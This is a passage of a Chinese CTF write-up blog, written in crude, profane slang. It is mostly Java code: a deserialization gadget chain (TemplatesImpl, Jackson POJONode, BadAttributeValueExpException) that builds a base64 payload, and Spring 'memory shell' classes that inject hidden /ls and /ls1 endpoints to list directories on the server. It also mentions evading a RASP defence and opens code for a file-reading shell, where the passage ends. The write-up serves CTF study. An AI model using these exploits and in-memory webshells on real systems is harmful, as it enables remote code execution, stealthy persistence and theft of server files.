class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        ClassPool classPool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = classPool.get(evilref.class.getName());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(constructor);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//byte[][] codes = new byte[][]&#123;code&#125;;</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        ref(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;&#125;);</span><br><span class="line">        ref(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;shanghe&quot;</span>);</span><br><span class="line">        ref(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(exp);</span><br><span class="line">        WriteToFileExample(serialize_func.encryptToBase64(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteToFileExample</span><span class="params">(String args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;这是要写入文件的字符串内容&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">            writer.write(args);</span><br><span class="line">            writer.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;字符串已成功写入文件。&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;写入文件时发生错误：&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(Object obj,String field,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">reffield</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        reffield.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="内存的使用"><span id="内存的使用"> 内存🐎的使用🥵👴</span></h2><p>捏麻麻滴，太复杂了，还要写个内存马找到 RASP, 还好👴技高一筹.</p><h3 id="列目录"><span id="列目录"> 列目录</span></h3><p>nm, 跟喝大了一样，整这 b 玩意，艹😡</p><p>首先来一个递归列出所有目录文件的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">&quot;ls&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/ls&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;dir&quot;</span>); <span class="comment">// 替换为你的根目录路径</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (file.isFile()) &#123;</span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;File: &quot;</span> + file.getAbsolutePath());</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;Directory: &quot;</span> + file.getAbsolutePath());</span><br><span class="line">                        listFilesAndDirectories(file,response); <span class="comment">// 递归遍历子目录</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样的缺点是列出根目录的时候太多杂碎的东西，👴看不动，要不是👴知道 /home 下面有东西，这玩意太难找了.</p><p>优化一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">&quot;ls1&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/ls1&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls1</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;dir&quot;</span>); <span class="comment">// 替换为你的根目录路径</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (file!=<span class="literal">null</span>) &#123;</span><br><span class="line">                        response.getWriter().write(file.getAbsolutePath()+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112020.png" alt="微信截图_20231106112020"></p><p>这样看起来舒服多了，👴很中意😊</p><h3 id="读文件"><span id="读文件"> 读文件</span></h3><p>👴想尝试柏璐杯的代码，直接通过 <code>ResponseEntity</code>  下载文件，很可惜，失败了，但是涉及到二进制文件的读取，怎么办，👴用 base64 读出来，👴真 tm 是完美天才的 idol (bushi)</p><p>终于👴想明白了一件事，写出了内存🐎</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span 